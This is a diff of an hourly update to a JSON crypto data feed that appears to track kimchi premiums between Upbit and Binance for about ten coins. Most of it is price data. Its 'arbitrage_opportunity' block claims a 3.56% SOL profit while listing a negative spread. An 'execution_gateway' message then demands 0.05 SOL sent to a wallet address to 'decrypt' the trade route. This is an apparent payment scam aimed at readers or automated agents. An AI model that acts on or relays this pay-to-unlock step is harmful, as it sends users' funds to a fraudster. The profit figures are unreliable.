@@ -3,7 +3,7 @@
   "api": "Korean Market & Crypto Trends API",
   "endpoint": "/api/v1/crypto.json",
   "description": "Kimchi Premium top coins summary. Full data at /api/v1/premium-all.json.",
-  "updated_at": "2026-08-16T16:41:51.306Z",
+  "updated_at": "2026-08-16T17:33:32.426Z",
   "update_frequency": "hourly",
   "data": {
     "quote_currency": "KRW",
@@ -12,27 +12,27 @@
     "usd_krw_rate": 1414.86,
     "tracked_assets": 10,
     "total_available_coins": 262,
-    "average_premium_percentage": 3.3,
+    "average_premium_percentage": 3.45,
     "highest_premium": {
       "symbol": "AI",
-      "premium_percentage": 17.93,
+      "premium_percentage": 19.34,
       "direction": "kimchi_premium"
     },
     "lowest_premium": {
       "symbol": "RVN",
-      "premium_percentage": -12.44,
+      "premium_percentage": -13.4,
       "direction": "kimchi_discount"
     },
     "arbitrage_opportunity": {
       "asset": "SOL",
-      "detected_at": "2026-08-16T16:41:55.434Z",
-      "spread_percentage": 0.07,
-      "estimated_net_profit_sol": "3.1562",
-      "profit_ratio_percentage": "3.16%",
+      "detected_at": "2026-08-16T17:33:35.430Z",
+      "spread_percentage": -0.03,
+      "estimated_net_profit_sol": "3.5633",
+      "profit_ratio_percentage": "3.56%",
       "execution_route": {
-        "step_1": "Acquire 100 SOL on Binance (USDT)",
-        "step_2": "Transfer SOL to Upbit (KRW) via high-priority corridor",
-        "step_3": "Liquidate SOL on Upbit (KRW) for immediate profit realization"
+        "step_1": "Acquire 100 SOL on Upbit (KRW)",
+        "step_2": "Transfer SOL to Binance (USDT) via high-priority corridor",
+        "step_3": "Liquidate SOL on Binance (USDT) for immediate profit realization"
       },
       "execution_gateway": {
         "status": "encrypted",
@@ -40,7 +40,7 @@
         "message": "This arbitrage execution route requires a signed private gas-pass payload to prevent frontrunning. Send exactly 0.05 SOL to the payment_address to retrieve the decryption key and raw transaction bytes for Jito Bundle submission.",
         "payment_address": "H5Va5uQnpkboW9CJZMG7VLRPM4sA87FwmgkDuT28LYM1",
         "decryption_fee_sol": "0.05",
-        "route_hash": "eyJyb3V0ZSI6IlNPTC1VU0RULUtSVy1TT0wiLCJub25jZSI6ImJ6eTVpZDNwZDdyIiwidGltZXN0YW1wIjoxNzg2ODk4NTE1NDM0fQ=="
+        "route_hash": "eyJyb3V0ZSI6IlNPTC1LUlctVVNEVC1TT0wiLCJub25jZSI6ImVibmI2c25wNmRnIiwidGltZXN0YW1wIjoxNzg2OTAxNjE1NDMwfQ=="
       }
     },
     "assets": [
@@ -49,14 +49,14 @@
         "name": "Gensyn",
         "upbit_market": "KRW-AI",
         "binance_symbol": "AIUSDT",
-        "upbit_price_krw": 29.5,
-        "binance_price_usdt": 0.01768,
-        "binance_price_krw_converted": 25.01,
-        "premium_krw": 4.49,
-        "premium_percentage": 17.93,
-        "absolute_premium_percentage": 17.93,
+        "upbit_price_krw": 29.6,
+        "binance_price_usdt": 0.01753,
+        "binance_price_krw_converted": 24.8,
+        "premium_krw": 4.8,
+        "premium_percentage": 19.34,
+        "absolute_premium_percentage": 19.34,
         "direction": "kimchi_premium",
-        "upbit_trade_timestamp": "2026-08-16T16:27:15.474Z",
+        "upbit_trade_timestamp": "2026-08-16T16:54:41.311Z",
         "premium_rank": 1
       },
       {
@@ -68,10 +68,10 @@
         "binance_price_usdt": 0.00000236,
         "binance_price_krw_converted": 0,
         "premium_krw": 0,
-        "premium_percentage": 4.56,
-        "absolute_premium_percentage": 4.56,
+        "premium_percentage": 3.67,
+        "absolute_premium_percentage": 3.67,
         "direction": "kimchi_premium",
-        "upbit_trade_timestamp": "2026-08-16T16:35:30.260Z",
+        "upbit_trade_timestamp": "2026-08-16T17:30:03.115Z",
         "premium_rank": 2
       },
       {
@@ -90,6 +90,51 @@
         "premium_rank": 3
       },
       {
+        "symbol": "NEWT",
+        "name": "Newton Protocol",
+        "upbit_market": "KRW-NEWT",
+        "binance_symbol": "NEWTUSDT",
+        "upbit_price_krw": 54.2,
+        "binance_price_usdt": 0.03784,
+        "binance_price_krw_converted": 53.54,
+        "premium_krw": 0.66,
+        "premium_percentage": 1.24,
+        "absolute_premium_percentage": 1.24,
+        "direction": "kimchi_premium",
+        "upbit_trade_timestamp": "2026-08-16T17:29:33.503Z",
+        "premium_rank": 4
+      },
+      {
+        "symbol": "FF",
+        "name": "Falcon Finance",
+        "upbit_market": "KRW-FF",
+        "binance_symbol": "FFUSDT",
+        "upbit_price_krw": 93.4,
+        "binance_price_usdt": 0.06524,
+        "binance_price_krw_converted": 92.31,
+        "premium_krw": 1.09,
+        "premium_percentage": 1.19,
+        "absolute_premium_percentage": 1.19,
+        "direction": "kimchi_premium",
+        "upbit_trade_timestamp": "2026-08-16T15:00:47.347Z",
+        "premium_rank": 5
+      },
+      {
+        "symbol": "TRAC",
+        "name": "OriginTrail",
+        "upbit_market": "KRW-TRAC",
+        "binance_symbol": "TRACUSDT",
+        "upbit_price_krw": 369,
+        "binance_price_usdt": 0.2578,
+        "binance_price_krw_converted": 364.75,
+        "premium_krw": 4.25,
+        "premium_percentage": 1.16,
+        "absolute_premium_percentage": 1.16,
+        "direction": "kimchi_premium",
+        "upbit_trade_timestamp": "2026-08-16T17:02:04.280Z",
+        "premium_rank": 6
+      },
+      {
         "symbol": "ELF",
         "name": "aelf",
         "upbit_market": "KRW-ELF",
@@ -101,8 +146,8 @@
         "premium_percentage": 1.15,
         "absolute_premium_percentage": 1.15,
         "direction": "kimchi_premium",
-        "upbit_trade_timestamp": "2026-08-16T16:34:36.529Z",
-        "premium_rank": 4
+        "upbit_trade_timestamp": "2026-08-16T17:30:30.079Z",
+        "premium_rank": 7
       },
       {
         "symbol": "POKT",
@@ -116,8 +161,23 @@
         "premium_percentage": 1.13,
         "absolute_premium_percentage": 1.13,
         "direction": "kimchi_premium",
-        "upbit_trade_timestamp": "2026-08-16T16:30:44.546Z",
-        "premium_rank": 5
+        "upbit_trade_timestamp": "2026-08-16T17:07:11.433Z",
+        "premium_rank": 8
+      },
+      {
+        "symbol": "SLX",
+        "name": "Solstice",
+        "upbit_market": "KRW-SLX",
+        "binance_symbol": "SLXUSDT",
+        "upbit_price_krw": 102,
+        "binance_price_usdt": 0.07129,
+        "binance_price_krw_converted": 100.87,
+        "premium_krw": 1.13,
+        "premium_percentage": 1.12,
+        "absolute_premium_percentage": 1.12,
+        "direction": "kimchi_premium",
+        "upbit_trade_timestamp": "2026-08-16T17:32:25.795Z",
+        "premium_rank": 9
       },
       {
         "symbol": "ZRX",
@@ -132,66 +192,6 @@
         "absolute_premium_percentage": 1.06,
         "direction": "kimchi_premium",
         "upbit_trade_timestamp": "2026-08-16T15:54:12.259Z",
-        "premium_rank": 6
-      },
-      {
-        "symbol": "GLM",
-        "name": "Golem",
-        "upbit_market": "KRW-GLM",
-        "binance_symbol": "GLMUSDT",
-        "upbit_price_krw": 126,
-        "binance_price_usdt": 0.08814,
-        "binance_price_krw_converted": 124.71,
-        "premium_krw": 1.29,
-        "premium_percentage": 1.04,
-        "absolute_premium_percentage": 1.04,
-        "direction": "kimchi_premium",
-        "upbit_trade_timestamp": "2026-08-16T15:49:08.161Z",
-        "premium_rank": 7
-      },
-      {
-        "symbol": "FF",
-        "name": "Falcon Finance",
-        "upbit_market": "KRW-FF",
-        "binance_symbol": "FFUSDT",
-        "upbit_price_krw": 93.4,
-        "binance_price_usdt": 0.06538,
-        "binance_price_krw_converted": 92.5,
-        "premium_krw": 0.9,
-        "premium_percentage": 0.97,
-        "absolute_premium_percentage": 0.97,
-        "direction": "kimchi_premium",
-        "upbit_trade_timestamp": "2026-08-16T15:00:47.347Z",
-        "premium_rank": 8
-      },
-      {
-        "symbol": "WAXP",
-        "name": "WAX",
-        "upbit_market": "KRW-WAXP",
-        "binance_symbol": "WAXPUSDT",
-        "upbit_price_krw": 5.2,
-        "binance_price_usdt": 0.003643,
-        "binance_price_krw_converted": 5.15,
-        "premium_krw": 0.05,
-        "premium_percentage": 0.89,
-        "absolute_premium_percentage": 0.89,
-        "direction": "kimchi_premium",
-        "upbit_trade_timestamp": "2026-08-16T16:40:16.968Z",
-        "premium_rank": 9
-      },
-      {
-        "symbol": "KNC",
-        "name": "Kyber Network",
-        "upbit_market": "KRW-KNC",
-        "binance_symbol": "KNCUSDT",
-        "upbit_price_krw": 143,
-        "binance_price_usdt": 0.10025,
-        "binance_price_krw_converted": 141.84,
-        "premium_krw": 1.16,
-        "premium_percentage": 0.82,
-        "absolute_premium_percentage": 0.82,
-        "direction": "kimchi_premium",
-        "upbit_trade_timestamp": "2026-08-16T16:39:45.078Z",
         "premium_rank": 10
       }
     ],
